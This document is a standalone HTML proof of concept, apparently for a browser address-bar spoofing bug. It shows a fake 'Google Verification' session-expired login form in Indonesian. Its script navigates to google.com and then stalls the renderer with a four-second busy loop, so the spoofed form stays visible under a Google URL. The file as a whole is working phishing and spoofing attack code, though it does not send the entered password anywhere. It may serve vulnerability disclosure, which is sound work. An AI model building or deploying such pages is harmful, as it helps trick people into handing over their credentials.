<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PoC Renderer Starvation</title>
    <style>
        body {
            font-family: sans-serif;
            text-align: center;
            margin-top: 100px;
            background: white;
        }

        .login-box {
            border: 1px solid #ccc;
            padding: 30px;
            display: inline-block;
            border-radius: 8px;
        }

        input {
            display: block;
            margin: 10px auto;
            padding: 10px;
            width: 80%;
        }

        button {
            padding: 10px 20px;
            background: #1a73e8;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
    </style>
</head>

<body>

    <div class="login-box" id="content">
        <h2 style="color: #ea4335;">Google Verification</h2>
        <p>Sesi Anda habis. Silakan konfirmasi ulang.</p>
        <input type="text" placeholder="Email" value="victim@email.com" disabled>
        <input type="password" placeholder="Password">
        <button onclick="executeStarvationSpoof()">Lanjutkan</button>
    </div>

    <script>
        function executeStarvationSpoof() {
            document.querySelector('button').innerText = "Loading...";
            window.location.href = "https://www.google.com/";
            const stallDuration = 4000;
            const start = Date.now();

            while (Date.now() - start < stallDuration) {
                Math.sqrt(Math.random() * Math.random());
            }
        }
    </script>

</body>

</html>
